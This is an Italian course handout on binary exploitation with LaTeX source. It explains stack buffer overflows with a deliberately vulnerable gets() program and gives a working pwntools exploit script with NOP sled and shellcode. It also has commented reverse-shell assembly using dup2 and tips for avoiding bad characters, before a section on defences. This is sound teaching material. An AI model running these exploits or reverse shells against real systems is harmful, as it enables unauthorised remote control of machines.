\documentclass[11pt,a4paper]{article}

% --- Packages ---
\usepackage[margin=.75in]{geometry}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern} % Fix for font not found error
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{hyperref}
\usepackage{xcolor}
\usepackage{fancyhdr}
\usepackage{comment}
\usepackage{cleveref}
\usepackage[bottom]{footmisc}
\usepackage{graphicx}
\usepackage{longtable}
\usepackage{booktabs}
\usepackage{array}
\usepackage{calc}
\usepackage{etoolbox}

% Standard Pandoc setup
\providecommand{\tightlist}{%
  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}

\crefformat{section}{\S#2#1#3}
\crefformat{subsection}{\S#2#1#3}
\crefformat{subsubsection}{\S#2#1#3}
\crefformat{figure}{#2Figure~#1#3}
\crefformat{footnote}{#2\footnotemark[#1]#3}

\linespread{0.9} % Riduce lo spazio tra le linee

% --- Colors ---
\definecolor{primary}{RGB}{0, 0, 0}
\definecolor{links}{HTML}{0000EE}
\definecolor{blue}{HTML}{26428B}

\hypersetup{
    colorlinks=true,
    linkcolor=links,
    urlcolor=links,
    citecolor=links,
}

% --- Section Formatting ---
\titleformat{\section}
  {\normalfont\Large\bfseries\color{blue}}{\thesection}{1em}{}
\titleformat{\subsection}
{\normalfont\large\bfseries\color{blue}}{\thesubsection}{1em}{}
\titleformat{\subsubsection}
{\normalfont\bfseries\color{blue}}{\thesubsubsection}{1em}{}

% --- Header and Footer ---
\pagestyle{fancy}
\fancyhead[L]{\small Giuseppe Capasso}
\fancyhead[R]{\small vapt}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.4pt}

% --- Custom Title Command ---
\newcommand{\proposaltitle}[1]{
    \begin{center}
        \vspace*{0.1cm}
        {\LARGE \bfseries \color{blue} #1} \\[1.5ex]
        {\large \textbf{Giuseppe Capasso}} \\[1ex]
                \small{
            \vspace{0.1cm}
            \textbf{Materia:} vapt\\
        }
            \end{center}
    \vspace{0.3cm}
    \hrule height 0.5pt
    \vspace{0.5cm}
}

\begin{document}

\proposaltitle{5. Architettura Avanzata: Shellcode di Rete ed Encoding}

\subsection{1. Introduzione alla Binary
Exploitation}\label{introduzione-alla-binary-exploitation}

La \textbf{Binary Exploitation} (spesso definita \emph{pwn} in gergo
hacker) è una branca della sicurezza offensiva che si concentra
sull\textquotesingle individuazione e lo sfruttamento di vulnerabilità
all\textquotesingle interno di file eseguibili (binari compilati).
L\textquotesingle obiettivo principale di questa pratica non è alterare
il codice sorgente, di cui spesso non disponiamo, ma manipolare il
flusso di esecuzione del programma fornendo input malformati o
inaspettati.

Nel corso di queste lezioni, il nostro traguardo sarà ottenere
l\textquotesingle{}\textbf{Arbitrary Code Execution (ACE)}. Sfrutteremo
le debolezze di un binario per costringere il sistema a eseguire codice
fornito da noi (chiamato \emph{shellcode}), con lo scopo finale di far
spawnare una shell di sistema (locale o remota) che ci garantisca il
controllo sul processo compromesso.

\subsection{2. Architettura del Sistema e Gestione della
Memoria}\label{architettura-del-sistema-e-gestione-della-memoria}

Per poter sfruttare un binario, dobbiamo prima comprendere come il
sistema operativo e la CPU gestiscono l\textquotesingle esecuzione di un
processo in memoria. Lavoreremo principalmente su architetture x86
(32-bit).

\subsubsection{I Registri della CPU}\label{i-registri-della-cpu}

La CPU esegue le istruzioni utilizzando una memoria interna ad altissima
velocità composta dai \textbf{Registri}. Questi vengono utilizzati per
memorizzare temporaneamente dati, indirizzi di memoria e lo stato
dell\textquotesingle esecuzione. Ai fini
dell\textquotesingle exploitation, il registro in assoluto più critico è
l\textquotesingle{}\textbf{Instruction Pointer (RIP nei sistemi a
64-bit, EIP nei 32-bit)}.

\begin{itemize}
\tightlist
\item
  Il registro \textbf{RIP} contiene in ogni istante
  l\textquotesingle indirizzo di memoria della \emph{prossima
  istruzione} che la CPU dovrà eseguire. Se riusciamo a prendere il
  controllo del valore contenuto in RIP, possiamo deviare il flusso del
  programma verso un indirizzo di nostra scelta (ad esempio, verso il
  nostro shellcode).
\end{itemize}

\subsubsection{Layout della Memoria di un
Processo}\label{layout-della-memoria-di-un-processo}

Quando il sistema operativo carica un binario in memoria (RAM) per
eseguirlo, assegna al processo uno spazio di indirizzamento virtuale
segmentato in diverse aree specifiche. Le principali sono:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Text (o Code):} Contiene le istruzioni macchina eseguibili del
  programma. Questa sezione è tipicamente di sola lettura (Read-Only)
  per prevenire la modifica accidentale o dolosa del codice durante
  l\textquotesingle esecuzione.
\item
  \textbf{Data \& BSS:} Queste sezioni ospitano le variabili globali e
  statiche. La sezione \emph{Data} contiene quelle inizializzate dal
  programmatore, mentre la \emph{BSS} contiene quelle non inizializzate
  (impostate a zero di default).
\item
  \textbf{Heap:} È l\textquotesingle area di memoria dedicata
  all\textquotesingle allocazione dinamica (es. quando in C si
  utilizzano funzioni come malloc() o calloc()). Viene utilizzata per
  strutture dati la cui dimensione non è nota a tempo di compilazione.
  Cresce tipicamente verso gli indirizzi di memoria più alti.
\item
  \textbf{Stack:} È la struttura di memoria fondamentale per la gestione
  delle chiamate a funzione e delle variabili locali.

  \begin{itemize}
  \item
    Lo Stack opera con una logica \textbf{LIFO} (\emph{Last In, First
    Out}).
  \item
    Ogni volta che viene chiamata una funzione, viene creato un blocco
    di memoria sullo stack chiamato \textbf{Stack Frame}.
  \item
    Lo Stack Frame contiene le variabili locali della funzione, i
    parametri passati alla funzione e, soprattutto, il \textbf{Return
    Address} (l\textquotesingle indirizzo a cui il programma deve
    ritornare una volta terminata l\textquotesingle esecuzione della
    funzione).
  \item
    Modificare illegalmente questo \emph{Return Address} sullo Stack è
    la base dei classici attacchi di corruzione della memoria.
  \end{itemize}
\end{enumerate}

\includegraphics[width=6.69306in,height=5.29444in]{media/image1.png}

\subsection{3. Il Formato ELF}\label{il-formato-elf}

Sui sistemi operativi Unix-like (come la distribuzione Kali Linux che
utilizzeremo per i laboratori), lo standard per i file eseguibili, le
librerie condivise e i core dump è il formato \textbf{ELF (Executable
and Linkable Format)}. Un file ELF contiene non solo il codice macchina,
ma anche una serie di header e tabelle che istruiscono il \emph{loader}
del sistema operativo su come mappare il file nella memoria virtuale del
processo, definendo i permessi (lettura, scrittura, esecuzione) per ogni
segmento (Text, Data, ecc.).

\includegraphics[width=3.4375in,height=3.8125in]{media/image2.png}

\subsection{4. Vulnerabilità del linguaggio C: Il Buffer
Overflow}\label{vulnerabilituxe0-del-linguaggio-c-il-buffer-overflow}

La maggior parte dei sistemi operativi, dei demoni di rete e dei tool di
sistema sono scritti in \textbf{C} o C++. Il C offre prestazioni elevate
e un controllo a basso livello dell\textquotesingle hardware, ma manca
di una caratteristica fondamentale presente in linguaggi più moderni: la
\textbf{memory safety}.

In C, la gestione della memoria è interamente delegata al programmatore.
Il linguaggio non effettua alcun \emph{bounds checking} automatico
(controllo dei limiti). Se allochiamo un array (buffer) di 10 byte e
cerchiamo di scriverne 20, il C non solleverà
un\textquotesingle eccezione a runtime bloccando
l\textquotesingle operazione; scriverà semplicemente i 10 byte extra
nelle locazioni di memoria contigue. Questo difetto strutturale causa il
\textbf{Buffer Overflow}.

\subsubsection{Analisi di un codice C
vulnerabile}\label{analisi-di-un-codice-c-vulnerabile}

Esaminiamo il seguente sorgente in C:

C

\#include \textless stdio.h\textgreater{}

int main() \{

// Allocazione di un buffer di 10 byte sullo Stack

char buffer{[}10{]};

printf("Inserisci l\textquotesingle input:\textbackslash n");

// gets() legge da standard input fino a incontrare un newline

gets(buffer);

printf("Hai inserito: \%s\textbackslash n", buffer);

return 0;

\}

\textbf{Analisi della vulnerabilità:} Il problema risiede
nell\textquotesingle utilizzo della funzione di libreria standard
gets(). Questa funzione è deprecata e considerata estremamente insicura
poiché legge i dati dallo \emph{standard input} copiandoli nel buffer di
destinazione senza effettuare alcun controllo sulla lunghezza dei dati
immessi rispetto alla dimensione del buffer allocato.

\begin{itemize}
\item
  \textbf{Esecuzione prevista:} L\textquotesingle utente fornisce una
  stringa di 5 caratteri (es. Test1). La stringa viene inserita nel
  buffer di 10 byte allocato nello Stack senza causare problemi.
\item
  \textbf{Exploitation:} L\textquotesingle utente fornisce un input di
  30 caratteri (es. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA). Poiché il buffer
  buffer nello Stack è grande solo 10 byte, la funzione gets() scriverà
  i primi 10 caratteri nel buffer, mentre i successivi 20 andranno a
  sovrascrivere i dati adiacenti (indirizzi di memoria superiori)
  all\textquotesingle interno dello Stack Frame.
\end{itemize}

Nello Stack, subito dopo le variabili locali, risiede il \textbf{Saved
Return Address}. Sfruttando questo Buffer Overflow, possiamo calcolare
l\textquotesingle esatto offset (la distanza) necessario per far sì che
il nostro input sovrascriva proprio i byte che compongono
l\textquotesingle indirizzo di ritorno. Quando la funzione main()
terminerà (con return 0), la CPU andrà a leggere
l\textquotesingle indirizzo di ritorno corrotto dallo Stack, lo
caricherà nel registro \textbf{RIP}, e il flusso di esecuzione passerà
sotto il nostro totale controllo.

Strumenti utili per capire il funzionamento della memoria:

\begin{itemize}
\item
  \url{https://circuitlabs.net/labs/c-stack-heap-memory-visualizer-learning-tool/}
\item
  \url{https://godbolt.org/}
\item
  \href{https://pythontutor.com/c.html}{\includegraphics[width=2.75139in,height=3.95833in]{media/image3.png}}https://pythontutor.com/c.html
\end{itemize}

\subsection{1. Il Target: Codice Vulnerabile e
Compilazione}\label{il-target-codice-vulnerabile-e-compilazione}

Il nostro bersaglio è un semplice programma in C che accetta un input
dall\textquotesingle utente. La vulnerabilità risiede
nell\textquotesingle utilizzo della funzione deprecata gets(), la quale
non effettua alcun controllo sui limiti del buffer allocato.

\subsubsection{Il Codice Sorgente
(hello.c)}\label{il-codice-sorgente-hello.c}

C

\#include \textless stdio.h\textgreater{}

\#include \textless string.h\textgreater{}

void hello() \{

char buffer{[}64{]};

printf("Inserisci il tuo nome: ");

// VULNERABILITÀ: Nessun controllo sulla dimensione
dell\textquotesingle input

gets(buffer);

printf("Ciao, \%s!\textbackslash n", buffer);

\}

int main() \{

hello();

return 0;

\}

\subsubsection{Preparazione dell\textquotesingle Ambiente
(Disabilitazione
Protezioni)}\label{preparazione-dellambiente-disabilitazione-protezioni}

Per scopi didattici e per comprendere le basi
dell\textquotesingle exploitation, dobbiamo disabilitare le protezioni
moderne introdotte dai sistemi operativi e dai compilatori.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Disabilitare ASLR (Address Space Layout Randomization):}
  L\textquotesingle ASLR randomizza gli indirizzi di memoria a ogni
  esecuzione. Dobbiamo disabilitarla a livello di kernel per avere
  indirizzi di memoria statici e predicibili.

  Bash

  sudo sysctl -w kernel.randomize\_va\_space=0
\item
  \textbf{Compilazione del Binario:} Utilizziamo gcc con flag specifici
  per rimuovere le mitigazioni:

  Bash

  gcc -m32 -fno-stack-protector -z execstack -no-pie hello.c -o hello

  \begin{itemize}
  \item
    -m32: Compila il binario per un\textquotesingle architettura a
    32-bit (x86).
  \item
    -fno-stack-protector: Disabilita i "Canaries", i controlli di
    integrità dello Stack.
  \item
    -z execstack: Rende lo Stack un\textquotesingle area di memoria
    eseguibile (fondamentale per eseguire il nostro shellcode).
  \item
    -no-pie: Disabilita il Position Independent Executable.
  \end{itemize}
\end{enumerate}

\subsection{2. Analisi Dinamica con pwndbg e De Bruijn
Sequence}\label{analisi-dinamica-con-pwndbg-e-de-bruijn-sequence}

Per analizzare il comportamento del programma in memoria, utilizzeremo
\textbf{GDB} equipaggiato con l\textquotesingle estensione
\textbf{pwndbg}, standard de facto per la binary exploitation.

\subsubsection{Individuazione
dell\textquotesingle Offset}\label{individuazione-delloffset}

Sappiamo che inserendo più di 64 caratteri causeremo un Buffer Overflow.
Tuttavia, dobbiamo scoprire il numero \emph{esatto} di byte necessari
per raggiungere e sovrascrivere il registro \textbf{EIP} (Instruction
Pointer), ovvero l\textquotesingle indirizzo di ritorno.

Per farlo in modo ingegneristico, utilizziamo una \textbf{sequenza di De
Bruijn} (un pattern ciclico in cui ogni blocco di 4 byte è univoco).

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Generiamo il pattern} tramite pwntools:

  Bash

  pwn cyclic 150

  \emph{(Copia la stringa generata, es: aaaabaaacaaadaaa...)}
\item
  \textbf{Avviamo il debugger} e forniamo la stringa come input:

  Bash

  gdb ./hello

  pwndbg\textgreater{} run

  Incolla il pattern generato quando il programma richiede
  l\textquotesingle input.
\item
  \textbf{Analisi del Crash (SIGSEGV):} Il programma crasherà.
  Analizzando l\textquotesingle output di pwndbg, osserveremo il
  registro EIP. Supponiamo di leggere EIP: 0x61616174 (che in ASCII
  corrisponde a taaa). Questo significa che
  l\textquotesingle Instruction Pointer è stato sovrascritto dalla
  stringa taaa contenuta nel nostro pattern.
\item
  \textbf{Calcolo dell\textquotesingle Offset:} Chiediamo a pwntools a
  quale posizione si trova quella specifica sottostringa:

  Bash

  pwn cyclic -l 0x61616174

  Se l\textquotesingle output è \textbf{76}, significa che dobbiamo
  inviare esattamente 76 byte di "spazzatura" (padding) prima di poter
  scrivere il nuovo indirizzo di ritorno.
\end{enumerate}

\subsection{3. Struttura del Payload e il concetto di NOP
Sled}\label{struttura-del-payload-e-il-concetto-di-nop-sled}

L\textquotesingle obiettivo dell\textquotesingle exploit è iniettare del
codice malevolo (Shellcode) nello Stack e costringere la CPU a
eseguirlo. La struttura del nostro payload sarà la seguente:

{[} Padding (76 byte) {]} + {[} Nuovo Indirizzo EIP (4 byte) {]} + {[}
NOP Sled {]} + {[} Shellcode {]}

\subsubsection{Cos\textquotesingle è il NOP
Sled?}\label{cosuxe8-il-nop-sled}

L\textquotesingle acronimo NOP sta per \emph{No Operation} (opcode 0x90
in x86). È un\textquotesingle istruzione che dice alla CPU: "non fare
nulla e passa all\textquotesingle istruzione successiva". Poiché
l\textquotesingle indirizzo esatto in cui viene caricato il nostro
buffer può variare leggermente tra l\textquotesingle ambiente di
debugging e l\textquotesingle esecuzione reale (a causa delle variabili
d\textquotesingle ambiente), calcolare al singolo byte
l\textquotesingle indirizzo di destinazione è complesso.

Il \textbf{NOP Sled} agisce come un "cuscinetto di atterraggio" o uno
scivolo. Se il nostro nuovo EIP punta in un punto qualsiasi
all\textquotesingle interno di questo scivolo di NOP, la CPU scorrerà su
di essi senza fare nulla, fino ad arrivare inevitabilmente e in modo
sicuro al nostro Shellcode.

\subsection{4. Automazione dell\textquotesingle Attacco: Exploit in
Python}\label{automazione-dellattacco-exploit-in-python}

Per rendere l\textquotesingle attacco affidabile, scriveremo uno script
in Python sfruttando pwntools. Invece di indovinare
l\textquotesingle indirizzo dello stack, automatizzeremo un processo in
due fasi: genereremo un crash controllato per leggere dal \emph{Core
Dump} l\textquotesingle indirizzo esatto in cui risiedeva il registro
\textbf{ESP}, e lo utilizzeremo come target per il nostro salto.

\textbf{Prerequisito fondamentale:} Abilitare la generazione dei core
dump nel terminale corrente:

Bash

ulimit -c unlimited

\subsubsection{Lo Script Base (Shell
Locale)}\label{lo-script-base-shell-locale}

Questo script fornisce una shell sulla macchina su cui stiamo eseguendo
il test.

Python

from pwn import *

import os

context.update(arch=\textquotesingle i386\textquotesingle,
os=\textquotesingle linux\textquotesingle)

context.log\_level = \textquotesingle error\textquotesingle{}

print("{[}*{]} FASE 1: Provoco un crash per trovare lo Stack Pointer
reale...")

os.system("rm -f core*")

p\_crash = process(\textquotesingle./hello\textquotesingle)

p\_crash.sendline(b"A" * 150)

p\_crash.wait()

try:

\# Leggiamo la memoria morta dal file generato dal crash

core = p\_crash.corefile

\# Estraiamo il valore di ESP al momento esatto del segfault

real\_esp = core.esp

print(f"{[}+{]} INDIRIZZO TROVATO: ESP = \{hex(real\_esp)\}")

except Exception as e:

print("{[}-{]} Impossibile leggere il core dump. Esegui
\textquotesingle ulimit -c unlimited\textquotesingle.")

exit()

print("{[}*{]} FASE 2: Lancio dell\textquotesingle exploit...")

context.log\_level = \textquotesingle info\textquotesingle{}

p = process(\textquotesingle./hello\textquotesingle)

offset = 76

ret\_address = real\_esp \# Usiamo l\textquotesingle indirizzo appena
calcolato

\# Generazione shellcode base fornito da pwntools

shellcode = asm(shellcraft.sh())

\# Costruzione del payload con un NOP Sled di 32 byte

payload = b"A" * offset

payload += p32(ret\_address)

payload += b"\textbackslash x90" * 32

payload += shellcode

p.sendline(payload)

p.interactive()

Ecco la stesura per la dispensa che copre la teoria
dell\textquotesingle encoding e l\textquotesingle architettura a basso
livello della reverse shell, spiegando esattamente \emph{perché} il
nostro shellcode è dovuto cambiare rispetto all\textquotesingle attacco
locale.

\section{5. Architettura Avanzata: Shellcode di Rete ed
Encoding}\label{architettura-avanzata-shellcode-di-rete-ed-encoding}

Nel passaggio dall\textquotesingle esecuzione di una shell locale
all\textquotesingle ottenimento di un accesso remoto (Reverse Shell), la
complessità del nostro payload aumenta drasticamente. Non ci limitiamo
più a chiedere al sistema operativo di "aprire un programma", ma
dobbiamo manipolare lo stack di rete e l\textquotesingle infrastruttura
di Input/Output del kernel Linux.

Prima di analizzare il nuovo shellcode, è fondamentale comprendere una
delle minacce strutturali più insidiose nello sviluppo degli exploit: i
caratteri proibiti.

\subsection{5.1 L\textquotesingle Invisibile Minaccia dei "Bad
Characters" ed
Encoding}\label{linvisibile-minaccia-dei-bad-characters-ed-encoding}

Quando sfruttiamo vulnerabilità basate sull\textquotesingle immissione
di stringhe (tramite funzioni come gets(), strcpy(), o scanf()), siamo
soggetti alle regole sintattiche del linguaggio C.

La funzione gets(), in particolare, è programmata per leggere dati dallo
Standard Input fino a quando non si verifica una di queste due
condizioni: incontra la fine del file (EOF) oppure incontra il carattere
\textbf{Newline} (il "ritorno a capo" o tasto Invio). A livello
macchina, il Newline corrisponde al byte esadecimale \textbf{0x0a}. Un
altro carattere storicamente problematico per altre funzioni C è il
\textbf{Null Byte} (\textbf{0x00}), che indica la terminazione di una
stringa.

Questi byte prendono il nome di \textbf{Bad Characters}.

\subsubsection{Il Problema nello
Shellcode}\label{il-problema-nello-shellcode}

Lo shellcode non è testo, è codice macchina compilato (sequenze di byte
esadecimali). Cosa succede se le istruzioni assembly che abbiamo scritto
generano, per puro caso, il byte 0x0a? Nel momento in cui inviamo il
payload, la funzione gets() inizierà a leggerlo e a scriverlo nello
Stack. Appena incontrerà il byte 0x0a, presumerà che
l\textquotesingle utente abbia premuto Invio. La funzione terminerà
l\textquotesingle operazione in quell\textquotesingle istante, troncando
il nostro payload a metà. L\textquotesingle indirizzo di ritorno non
verrà sovrascritto correttamente o lo shellcode risulterà incompleto,
causando un inevitabile \emph{Segmentation Fault}.

\textbf{Perché non abbiamo riscontrato questo errore nei nostri test?}
Nel nostro laboratorio abbiamo utilizzato l\textquotesingle indirizzo IP
di loopback 127.0.0.1. Se la nostra macchina attaccante (es. Kali su
VirtualBox) avesse avuto un IP come 10.0.2.15, la compilazione
dell\textquotesingle indirizzo IP all\textquotesingle interno dello
shellcode avrebbe generato il byte 0x0a (poiché 10 in decimale è 0x0a in
esadecimale). In quello scenario, il nostro exploit sarebbe fallito
silenziosamente.

\subsubsection{La Soluzione: L\textquotesingle Encoding in
Memoria}\label{la-soluzione-lencoding-in-memoria}

Per eludere questo limite, i penetration tester utilizzano tecniche di
\textbf{Encoding}. Invece di inviare lo shellcode puro,
quest\textquotesingle ultimo viene "offuscato" (solitamente tramite
un\textquotesingle operazione matematica di XOR) utilizzando una chiave
che elimina fisicamente tutti i byte 0x0a e 0x00 dal payload.

Tuttavia, la CPU non può eseguire codice offuscato. Pertanto,
l\textquotesingle encoder aggiunge in testa al payload un piccolissimo
programma chiamato \textbf{Decoder Stub} (privo di bad characters). Il
flusso di esecuzione diventa il seguente:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  L\textquotesingle EIP salta al nostro payload e inizia a eseguire il
  Decoder Stub.
\item
  Il Decoder Stub legge il resto del payload dalla RAM, lo decifra in
  tempo reale ripristinando i byte originali, e lo sovrascrive in
  memoria.
\item
  Terminato il ciclo, il Decoder cede il controllo allo shellcode
  decifrato, che viene eseguito normalmente.
\end{enumerate}

\subsection{5.2 Anatomia di una Reverse Shell su Linux: Oltre
l\textquotesingle execve}\label{anatomia-di-una-reverse-shell-su-linux-oltre-lexecve}

Per comprendere perché abbiamo dovuto scrivere istruzioni assembly
aggiuntive per la Reverse Shell, dobbiamo analizzare le differenze
architetturali rispetto a una shell locale.

\subsubsection{La Shell Locale (Il limite del
Terminale)}\label{la-shell-locale-il-limite-del-terminale}

Nel nostro primo exploit, lo shellcode si limitava a invocare la
\emph{System Call} (chiamata di sistema) execve("/bin/sh"). In Linux,
ogni processo eredita i canali di comunicazione dal processo "padre".
Quando il programma vulnerabile lancia /bin/sh,
quest\textquotesingle ultima utilizza i canali standard (Tastiera e
Monitor locale) per ricevere comandi e mostrare
l\textquotesingle output. L\textquotesingle attaccante remoto avvia il
programma, ma la shell rimane fisicamente intrappolata sul monitor della
vittima.

\subsubsection{Il Paradigma dei File
Descriptor}\label{il-paradigma-dei-file-descriptor}

In Linux vige una regola d\textquotesingle oro: \textbf{"Tutto è un
file"}. Anche l\textquotesingle Input e l\textquotesingle Output del
terminale sono trattati come file virtuali, identificati da un numero
intero chiamato \textbf{File Descriptor (FD)}. Di default, ogni
programma possiede tre FD primari:

\begin{itemize}
\item
  \textbf{0 (Standard Input - STDIN):} Da dove legge i comandi.
\item
  \textbf{1 (Standard Output - STDOUT):} Dove stampa i risultati.
\item
  \textbf{2 (Standard Error - STDERR):} Dove stampa gli errori.
\end{itemize}

\subsubsection{Il nuovo Shellcode: Ristrutturare
l\textquotesingle Input/Output}\label{il-nuovo-shellcode-ristrutturare-linputoutput}

Per ottenere una Reverse Shell, dobbiamo alterare la fisiologia del
sistema operativo. Non basta aprire una connessione di rete; dobbiamo
costringere la nuova shell a usare la rete al posto della tastiera e del
monitor.

Il nostro nuovo shellcode è composto da tre fasi distinte, eseguite in
sequenza millisecondi prima dell\textquotesingle avvio della shell:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Creazione del Socket (connect):} Il nostro codice chiede al
  kernel Linux di aprire una connessione TCP verso l\textquotesingle IP
  dell\textquotesingle attaccante. Poiché in Linux anche i socket di
  rete sono considerati file, il kernel assegna a questa nuova
  connessione il primo File Descriptor disponibile. Essendo 0, 1 e 2 già
  occupati, \textbf{la connessione di rete riceverà matematicamente il
  File Descriptor 3}. \emph{(Il canale verso
  l\textquotesingle attaccante è aperto, ma la shell non sa ancora di
  doverlo usare).}
\item
  \textbf{Il Reindirizzamento (dup2):} Questa è la fase cruciale che
  differenzia una Reverse Shell da un semplice payload. Utilizziamo la
  System Call dup2 (Duplicate File Descriptor) per sovrascrivere
  l\textquotesingle infrastruttura del processo. Istruiamo la CPU a
  eseguire queste tre operazioni:

  \begin{itemize}
  \item
    Copia il FD 3 (la Rete) e sovrascrivilo sul FD 0 (STDIN).
  \item
    Copia il FD 3 (la Rete) e sovrascrivilo sul FD 1 (STDOUT).
  \item
    Copia il FD 3 (la Rete) e sovrascrivilo sul FD 2 (STDERR).
  \end{itemize}
\item
  \textbf{L\textquotesingle Esecuzione (execve):} Solo ora, con i "cavi"
  virtuali scambiati, invochiamo execve("/bin/sh"). Quando la shell si
  avvia, cercherà di leggere i comandi dallo STDIN e di stampare sullo
  STDOUT. Senza saperlo, starà leggendo i pacchetti provenienti dalla
  macchina dell\textquotesingle attaccante e starà inviando i risultati
  dell\textquotesingle esecuzione attraverso il socket TCP, fino al
  nostro listener Netcat. Abbiamo ottenuto il controllo remoto.
\end{enumerate}

Per comprendere a pieno la potenza e l\textquotesingle eleganza di
questo attacco, dobbiamo scendere al livello
dell\textquotesingle Assembly x86 (l\textquotesingle effettivo
linguaggio macchina compreso dal processore).

Sui sistemi Linux a 32-bit, l\textquotesingle interazione con il kernel
(il cuore del sistema operativo) avviene tramite le \textbf{System
Call}. Per invocare una System Call, dobbiamo preparare i registri della
CPU secondo una convenzione ben precisa:

\begin{itemize}
\item
  \textbf{EAX}: Contiene il numero identificativo della System Call (es.
  11 per execve, 63 per dup2).
\item
  \textbf{EBX}: Contiene il primo argomento.
\item
  \textbf{ECX}: Contiene il secondo argomento.
\item
  \textbf{EDX}: Contiene il terzo argomento.
\item
  \textbf{int 0x80}: È l\textquotesingle istruzione di \emph{interrupt}
  che dice alla CPU: "Sospendi il programma utente e passa il controllo
  al Kernel con i parametri appena forniti".
\end{itemize}

Nello script Python precedente, abbiamo fuso macro preimpostate di
pwntools (per comodità strutturale) con assembly crudo scritto da noi
per il reindirizzamento dei File Descriptor.

Esaminiamo e traduciamo il blocco Assembly che abbiamo iniettato nello
Stack.

\subsubsection{Il Codice Assembly
Commentato}\label{il-codice-assembly-commentato}

Snippet di codice

/* FASE 1: Connessione TCP (Generata da shellcraft.connect) */

/* Il kernel crea il socket. Essendo il primo file aperto dal

nostro processo, gli viene assegnato il File Descriptor 3. */

/* FASE 2: Il Reindirizzamento (Scritto manualmente da noi) */

/* 2.1 Preparazione del target (Il nostro Socket) */

mov ebx, 3 ; Mettiamo in EBX il primo argomento: il FD del Socket (3)

/* 2.2 dup2(3, 0) - Reindirizziamo lo STDIN */

mov al, 0x3f ; 0x3f è 63 in esadecimale (identificativo di dup2)

xor ecx, ecx ; Un modo elegante per impostare ECX a 0 (STDIN)

int 0x80 ; Eseguiamo la System Call

/* 2.3 dup2(3, 1) - Reindirizziamo lo STDOUT */

mov al, 0x3f ; Ricarichiamo 63 in EAX (AL)

mov cl, 1 ; Mettiamo 1 in ECX (STDOUT)

int 0x80 ; Eseguiamo la System Call

/* 2.4 dup2(3, 2) - Reindirizziamo lo STDERR */

mov al, 0x3f ; Ricarichiamo 63 in EAX (AL)

mov cl, 2 ; Mettiamo 2 in ECX (STDERR)

int 0x80 ; Eseguiamo la System Call

/* FASE 3: L\textquotesingle Esecuzione (Generata da shellcraft.sh) */

/* A questo punto, pwntools genera l\textquotesingle assembly per
eseguire

sys\_execve("/bin/sh", NULL, NULL). L\textquotesingle output e
l\textquotesingle input di

questa shell viaggeranno ora attraverso il FD 3. */

\subsubsection{L\textquotesingle Arte di evitare i Bad Characters in
Assembly}\label{larte-di-evitare-i-bad-characters-in-assembly}

Se osserviamo attentamente il codice Assembly che abbiamo scritto per la
Fase 2, noteremo delle scelte stilistiche particolari. Questa è
l\textquotesingle essenza dello sviluppo di exploit (Exploit
Development).

\textbf{Perché non abbiamo usato istruzioni standard come mov eax, 63 o
mov ecx, 0?}

La risposta risiede nei \emph{Bad Characters} analizzati nel capitolo
precedente. Se scrivessimo mov eax, 63 (che in esadecimale è 0x3f), il
compilatore Assembly, sapendo che EAX è un registro a 32-bit (4 byte),
tradurrebbe l\textquotesingle istruzione in linguaggio macchina
riempiendo gli spazi vuoti con degli zeri: B8 3F 00 00 00

Questa sequenza contiene ben tre \textbf{Null Byte} (0x00). Come
sappiamo, la funzione gets() del nostro programma C vulnerabile si
fermerebbe al primo 0x00, troncando il nostro shellcode e facendo
fallire l\textquotesingle attacco.

Per aggirare questo ostacolo, abbiamo utilizzato \textbf{tecniche di
ottimizzazione Assembly (Shellcoding):}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Uso dei registri a 8-bit (AL, CL):} Invece di interagire con
  l\textquotesingle intero registro EAX (32-bit), abbiamo usato mov al,
  0x3f. AL rappresenta solo gli ultimi 8 bit (1 byte) del registro EAX.
  Modificando solo quell\textquotesingle ottetto,
  l\textquotesingle istruzione compilata risulta essere semplicemente B0
  3F, un\textquotesingle istruzione pulita, di soli 2 byte, e senza
  alcun Null Byte.
\item
  \textbf{L\textquotesingle uso dello XOR per azzerare i registri:}
  Invece di usare mov ecx, 0 (che genererebbe B9 00 00 00 00), abbiamo
  utilizzato l\textquotesingle operazione bit a bit \textbf{OR
  Esclusivo}: xor ecx, ecx. Qualsiasi valore elaborato in XOR con se
  stesso restituisce sempre \textbf{zero} (es. 1 XOR 1 = 0). Questa
  operazione è nativa nella CPU, è leggermente più veloce della
  direttiva mov, e soprattutto viene compilata nei byte 31 C9, azzerando
  il registro a 32-bit senza inserire un solo Null Byte nel nostro
  payload.
\end{enumerate}

Ecco l\textquotesingle ultimo capitolo della dispensa. Questo modulo è
fondamentale per chiudere il cerchio: dopo aver insegnato agli studenti
come distruggere un sistema, dobbiamo spiegare loro come
l\textquotesingle industria informatica si difende oggi e perché
studiamo queste tecniche se esistono le protezioni.

\section{7. Il Contrattacco della Difesa: Mitigazioni e Sicurezza
Moderna}\label{il-contrattacco-della-difesa-mitigazioni-e-sicurezza-moderna}

Nei laboratori precedenti abbiamo avuto gioco facile perché abbiamo
deliberatamente disabilitato le difese del sistema operativo e del
compilatore (tramite flag come -fno-stack-protector o disattivando
l\textquotesingle ASLR). Nel mondo reale, l\textquotesingle industria
informatica non è rimasta a guardare mentre i Buffer Overflow decimavano
la sicurezza dei server globali.

Nel corso degli anni, sono state implementate diverse difese
strutturali. Analizziamo le principali contromisure che incontreremo (e
che i penetration tester moderni devono imparare a eludere).

\subsection{7.1 Le Contromisure
Classiche}\label{le-contromisure-classiche}

\subsubsection{1. Stack Canaries (I
Canarini)}\label{stack-canaries-i-canarini}

Prende il nome dall\textquotesingle antica pratica dei minatori di
portare un canarino in miniera: se l\textquotesingle aria diventava
tossica, il canarino moriva prima dei minatori, dando
l\textquotesingle allarme. In informatica, lo \textbf{Stack Canary} è un
valore casuale (segreto e generato a ogni avvio) che il compilatore
inserisce nello Stack, posizionandolo esattamente tra le variabili
locali (il nostro buffer) e l\textquotesingle indirizzo di ritorno
(EIP/RIP).

